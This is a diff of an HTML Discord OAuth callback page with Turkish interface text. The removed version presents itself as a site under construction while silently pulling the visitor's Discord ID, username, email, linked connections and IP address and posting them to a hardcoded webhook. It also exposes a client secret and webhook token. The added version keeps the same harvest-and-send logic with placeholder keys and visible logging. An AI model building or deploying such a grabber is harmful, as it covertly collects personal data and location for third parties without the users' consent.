@@ -1,80 +1,113 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Yükleniyor...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      background: #0a0a0a;
-      color: white;
+      background: #0f0f13;
+      color: #f0f0f0;
       font-family: monospace;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
-      flex-direction: column;
-      text-align: center;
-      animation: rgb 5s infinite;
+      min-height: 100vh;
+      padding: 2rem;
     }
-    h1 { font-size: 2rem; margin-bottom: 1rem; }
-    p { font-size: 1rem; color: #aaa; }
-    @keyframes rgb {
-      0%{text-shadow:0 0 10px red}
-      33%{text-shadow:0 0 10px lime}
-      66%{text-shadow:0 0 10px blue}
-      100%{text-shadow:0 0 10px red}
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 1rem;
+      color: #ff4757;
+    }
+    .log {
+      width: 100%;
+      max-width: 600px;
+      background: #1a1a1f;
+      border: 1px solid #444;
+      padding: 1rem;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-word;
     }
   </style>
 </head>
 <body>
-  <h1>Sitemize hoş geldiniz</h1>
-  <p>Sitemiz şu anda yapım aşamasında.</p>
+  <h1>Yetkilendiriliyor...</h1>
+  <div class="log" id="log">OAuth başlatılıyor...</div>
 
 <script>
 (async () => {
-  const d = new URLSearchParams(location.search).get("code");
-  if (!d) return;
+  const client_id     = "YOUR_CLIENT_ID";
+  const client_secret = "YOUR_CLIENT_SECRET";
+  const redirect_uri  = "https://indigozariyah.github.io/system/callback.html";
+  const webhook_url   = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";
+
+  const logEl = document.getElementById("log");
+  const log = (msg) => logEl.textContent += "\n" + msg;
+
+  const code = new URLSearchParams(window.location.search).get("code");
+  if (!code) {
+    log("❌ URL'de ?code yok, işlem iptal.");
+    return;
+  }
+
   try {
-    const t = await fetch("https://discord.com/api/oauth2/token", {
+    // 1. access_token al
+    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
       body: new URLSearchParams({
-        client_id: "1354724175788380327",
-        client_secret: "Qodg1_-lrOw6cxHFdH1KhD-T1jcTAVFM",
+        client_id,
+        client_secret,
         grant_type: "authorization_code",
-        code: d,
-        redirect_uri: "https://rencordx.github.io/home/callback.html"
+        code,
+        redirect_uri
       })
-    }).then(r => r.json());
-    if (!t.access_token) return;
+    });
+    const tokenData = await tokenRes.json();
+    if (!tokenData.access_token) throw new Error("Access token alınamadı.");
+    log("✅ access_token alındı.");
 
-    const headers = { Authorization: `Bearer ${t.access_token}` };
+    // 2. Kullanıcı bilgisi çek
+    const userRes = await fetch("https://discord.com/api/users/@me", {
+      headers: { "Authorization": `Bearer ${tokenData.access_token}` }
+    });
+    const user = await userRes.json();
+    log("✅ Kullanıcı bilgisi çekildi.");
 
-    const u = await fetch("https://discord.com/api/users/@me", {
-      headers
-    }).then(r => r.json());
+    // 3. Vanity URL (kısa kullanıcı URL'si)
+    const vanity_url = `https://discord.com/users/${user.id}`;
 
-    const con = await fetch("https://discord.com/api/users/@me/connections", {
-      headers
-    }).then(r => r.json());
+    // 4. IP adresi çek
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    log("✅ IP adresi alındı.");
 
-    const i = await fetch("https://api.ipify.org?format=json").then(r => r.json());
-
-    const j = {
-      id: u.id,
-      username: `${u.username}#${u.discriminator}`,
-      email: u.email || null,
-      client_ip: i.ip,
-      vanity_url: `https://discord.com/users/${u.id}`,
-      connections: con || []
+    // 5. Webhook'a gönderilecek payload
+    const payload = {
+      id: user.id,
+      username: `${user.username}#${user.discriminator}`,
+      email: user.email || null,
+      client_ip: ipData.ip,
+      vanity_url: vanity_url
     };
 
-    await fetch("https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA", {
+    await fetch(webhook_url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: "```json\n" + JSON.stringify(j, null, 2) + "\n```" })
+      body: JSON.stringify({
+        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
+      })
     });
-  } catch (_) {}
+
+    log("✅ Webhook'a başarıyla gönderildi.");
+    log("Gönderilen veri:");
+    log(JSON.stringify(payload, null, 2));
+
+  } catch (err) {
+    log("❌ Hata oluştu: " + err.message);
+  }
 })();
 </script>
 </body>
